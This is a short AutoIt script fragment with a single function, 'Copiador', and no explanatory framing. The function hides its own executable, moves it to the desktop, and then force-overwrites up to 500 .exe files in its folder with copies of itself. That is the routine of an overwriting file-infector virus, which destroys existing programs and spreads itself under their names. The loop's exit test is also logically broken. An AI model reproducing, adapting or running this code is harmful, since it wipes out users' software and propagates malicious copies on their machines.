Func Copiador()
FileSetAttrib(@AutoItExe,"+H")
FileMove(@AutoItExe,@DesktopDir & "\" & @ScriptName)
Local $_Find = FileFindFirstFile("*.exe")
Local $_Next = ""
For $_I = 0 To 500
$_Next = FileFindNextFile($_Find)

	FileCopy(@AutoItExe,@ScriptDir & "\" & $_Next,1)
	FileSetAttrib(@ScriptDir & "\" & $_Next,"-H")
	If $_Next = @error Or "" Then ExitLoop
Next
EndFunc